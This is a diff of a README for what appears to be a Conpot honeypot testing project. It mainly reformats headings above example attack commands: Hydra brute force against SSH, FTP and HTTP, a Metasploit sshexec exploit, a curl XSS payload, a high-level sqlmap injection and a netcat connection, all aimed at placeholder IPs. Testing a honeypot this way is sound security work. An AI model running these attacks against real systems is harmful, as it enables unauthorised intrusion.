@@ -324,7 +324,7 @@ nmap -sV <indirizzo-IP>        # Service version detection
 <br>
 <br>
 
-**Testing (ModBusSploit) 🛠️**
+#### **Testing (ModBusSploit) 🛠️**
 
 In this section, we will perform tests on the **[ModBusSploit](https://github.com/C4l1b4n/ModBusSploit/)** tool to simulate attacks on the Conpot honeypot.
 
@@ -357,17 +357,16 @@ python3 start.py
 
 <br>
 <br>
+<br>
 
-**Brute force attack examples using Hydra:**
+### **Brute force attack examples using Hydra:**
 ```sh
 hydra -l <utente> -P <file_wordlist> ssh://<indirizzo-IP>
 hydra -l <utente> -P <file_wordlist> ftp://<indirizzo-IP>
 hydra -l <utente> -P <file_wordlist> http-get://<indirizzo-IP>
 ```
 
-
-
-**Exploitation example using Metasploit:**
+### **Exploitation example using Metasploit:**
 ```sh
 msfconsole
 use exploit/linux/ssh/sshexec
@@ -377,17 +376,17 @@ set PASSWORD <password>
 exploit
 ```
 
-**Example of an XSS attack using curl:**
+### **Example of an XSS attack using curl:**
 ```sh
 curl -X POST -d "username=<script>alert('XSS')</script>" http://<indirizzo-IP>/login
 ```
 
-**SQL injection example using sqlmap:**
+### **SQL injection example using sqlmap:**
 ```sh
 sqlmap -u "http://<indirizzo-IP>/page?id=1" --risk=3 --level=5
 ```
 
-**Netcat example to connect to port 80 (HTTP):**
+### **Netcat example to connect to port 80 (HTTP):**
 ```sh
 nc -v <indirizzo-IP> 80
 ```
